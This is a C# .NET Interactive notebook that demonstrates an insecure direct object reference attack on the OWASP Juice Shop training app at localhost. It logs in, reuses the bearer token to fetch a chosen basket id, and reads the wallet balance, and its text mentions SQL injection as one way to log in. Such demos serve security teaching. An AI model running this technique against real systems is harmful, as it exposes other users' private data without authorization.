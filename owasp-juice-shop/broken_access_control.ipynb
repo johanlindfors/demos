{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Broken Access Control\n",
    "\n",
    "## View another user's shopping basket\n",
    "We will be using an IDOR (Insecure direct object reference) in this attack to examin another users shopping basket. After having created an account on Juice Shop we can access our own shopping basket through the rest API."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    }
   },
   "outputs": [],
   "source": [
    "#r \"nuget: System.Net.Http.Json, *-*\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    }
   },
   "outputs": [],
   "source": [
    "using System.Net.Http;\n",
    "using System.Net.Http.Json;\n",
    "using System.Net.Http.Headers;\n",
    "\n",
    "const string BASE_URL = \"http://localhost:3000/\";\n",
    "var BASE_URI = new Uri(BASE_URL); "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 2. Login as an authenticated user\n",
    "Either use sql injection or proper properties to authenticate a user"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "javascript"
    }
   },
   "outputs": [],
   "source": [
    "#!value --name json\n",
    "{\n",
    "    \"email\": \"<EMAIL>\",\n",
    "    \"password\": \"<PASSWORD>\"\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    }
   },
   "outputs": [],
   "source": [
    "#!share json --from value\n",
    "\n",
    "public struct AuthenticationToken {\n",
    "    public Authentication Authentication {get;set;}\n",
    "}\n",
    "\n",
    "public struct Authentication {\n",
    "    public string Token { get;set; }\n",
    "    public int Bid { get;set; }\n",
    "    public string Umail { get;set; }\n",
    "}\n",
    "\n",
    "var authenticationToken = string.Empty;\n",
    "\n",
    "using(var client = new HttpClient()) {\n",
    "    var content = new StringContent(json, Encoding.UTF8, \"application/json\");\n",
    "    var uri = new Uri(BASE_URI, \"rest/user/login\");\n",
    "    var response = await client.PostAsync(uri, content);\n",
    "    response.EnsureSuccessStatusCode();\n",
    "\n",
    "    var actualtoken = await response.Content.ReadFromJsonAsync<AuthenticationToken>();\n",
    "    authenticationToken = actualtoken.Authentication.Token;\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Fetch your current basket\n",
    "If we intercept the /basket url fetch we can see in the network tab that our basket is fetched through a rest call with the basked id as parameter in the URL. What happens if we change this value?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    }
   },
   "outputs": [],
   "source": [
    "using(var client = new HttpClient()) {\n",
    "    \n",
    "    var request = new HttpRequestMessage \n",
    "    {\n",
    "        Method = HttpMethod.Get,\n",
    "        RequestUri = new Uri(BASE_URI, \"rest/basket/<BASKET_ID_HERE>\")\n",
    "    };\n",
    "\n",
    "    request.Headers.Authorization = new AuthenticationHeaderValue(\"Bearer\", authenticationToken);\n",
    "    var response = await client.SendAsync(request);\n",
    "    Console.WriteLine(await response.Content.ReadAsStringAsync());\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{\"status\":\"success\",\"data\":-29}\n"
     ]
    }
   ],
   "source": [
    "using(var client = new HttpClient()) {\n",
    "    var request = new HttpRequestMessage\n",
    "    {\n",
    "        Method = HttpMethod.Get,\n",
    "        RequestUri = new Uri(BASE_URI, \"rest/wallet/balance\")\n",
    "    };\n",
    "\n",
    "    request.Headers.Authorization = new AuthenticationHeaderValue(\"Bearer\", authenticationToken);\n",
    "    var response = await client.SendAsync(request);\n",
    "\n",
    "    Console.WriteLine(await response.Content.ReadAsStringAsync());\n",
    "}"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (C#)",
   "language": "C#",
   "name": ".net-csharp"
  },
  "language_info": {
   "file_extension": ".cs",
   "mimetype": "text/x-csharp",
   "name": "C#",
   "pygments_lexer": "csharp",
   "version": "9.0"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
